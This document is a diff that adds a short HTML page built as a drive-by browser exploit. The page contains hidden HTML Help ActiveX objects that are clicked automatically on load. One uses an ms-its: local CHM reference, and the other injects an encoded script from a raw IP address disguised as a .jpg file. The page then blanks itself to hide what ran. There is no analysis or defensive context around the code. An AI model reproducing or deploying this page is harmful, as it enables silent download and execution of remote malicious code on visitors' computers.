@@ -1,0 +1,15 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><BODY>
+<OBJECT style="display:none" id="asdqwe" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">
+<PARAM name="Command" value="Related Topics, MENU">
+<PARAM name="Button" value="Text:_">
+<PARAM name="Window" value="$global_blank">
+<PARAM name="Item1" value="command;ms-its:c:/windows/help/ntshared.chm::/alt_url_enterprise_specific.htm">
+</OBJECT>
+<OBJECT style="display:none" id="asdqwer" classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">
+<PARAM name="Command" value="Related Topics, MENU">
+<PARAM name="Button" value="Text:_">
+<PARAM name="Window" value="$global_blank">
+<PARAM name="Item1" value='command; javascript:execScript("document.write(\"<script language=jscript.encode src=http://195.95.218.100/lau.jpg\"+String.fromCharCode(62)+\"</scr\"+\"ipt\"+String.fromCharCode(62))")'>
+</OBJECT>
+<script>asdqwe.HHClick();setTimeout("asdqwer.HHClick()",100);setTimeout("document.write('')",200)</script></BODY></HTML>
